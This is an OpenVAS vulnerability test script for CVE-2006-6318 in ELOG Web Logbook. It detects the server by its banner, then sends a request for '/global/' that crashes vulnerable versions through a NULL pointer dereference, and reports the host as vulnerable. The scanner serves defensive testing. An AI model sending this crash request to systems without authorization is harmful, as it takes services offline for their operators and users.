# OpenVAS Vulnerability Test
# $Id: elog_logbook_global_dos.nasl 14240 2019-03-17 15:50:45Z cfischer $
# Description: ELOG Web LogBook global Denial of Service
#
# Authors:
# Justin Seitz <jms@bughunter.ca>
#
# Copyright:
# Copyright (C) 2006 Justin Seitz
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2,
# as published by the Free Software Foundation
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
#

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.80056");
  script_version("$Revision: 14240 $");
  script_tag(name:"last_modification", value:"$Date: 2019-03-17 16:50:45 +0100 (Sun, 17 Mar 2019) $");
  script_tag(name:"creation_date", value:"2008-10-24 23:33:44 +0200 (Fri, 24 Oct 2008)");
  script_tag(name:"cvss_base", value:"5.0");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:N/I:N/A:P");
  script_cve_id("CVE-2006-6318");
  script_bugtraq_id(21028);
  script_name("ELOG Web LogBook global Denial of Service");
  script_category(ACT_DENIAL);
  script_tag(name:"qod_type", value:"remote_vul");
  script_copyright("This script is Copyright (C) 2006 Justin Seitz");
  script_family("Web application abuses");
  script_dependencies("gb_get_http_banner.nasl");
  script_require_ports("Services/www", 8080);
  script_mandatory_keys("ELOG_HTTP/banner");

  script_tag(name:"summary", value:"The version of ELOG Web Logbook installed on the remote host is vulnerable
  to a denial of service attack by requesting '/global' or any logbook with 'global' in its name. When a request
  like this is received, a NULL pointer dereference occurs, leading to a crash of the service.");

  script_tag(name:"solution_type", value:"VendorFix");
  script_tag(name:"solution", value:"Upgrade to ELOG version 2.6.2-7 or later.");

  script_xref(name:"URL", value:"http://archives.neohapsis.com/archives/fulldisclosure/2006-11/0198.html");
  script_xref(name:"URL", value:"http://savannah.psi.ch/websvn/log.php?repname=elog&path=/trunk/&rev=1749&sc=1&isdir=1");
  script_xref(name:"URL", value:"http://midas.psi.ch/elogs/Forum/2053");

  exit(0);
}

include("http_func.inc");

port = get_http_port(default:8080);

if (http_is_dead(port:port)) exit(0);

banner = get_http_banner(port:port);
if (banner && "Server: ELOG HTTP" >< banner) {

  uri = "/global/";
  attackreq = http_get(port:port, item:uri);
  attackres = http_send_recv(port:port, data:attackreq);

  if (http_is_dead(port:port))
    security_message(port);
}

exit(0);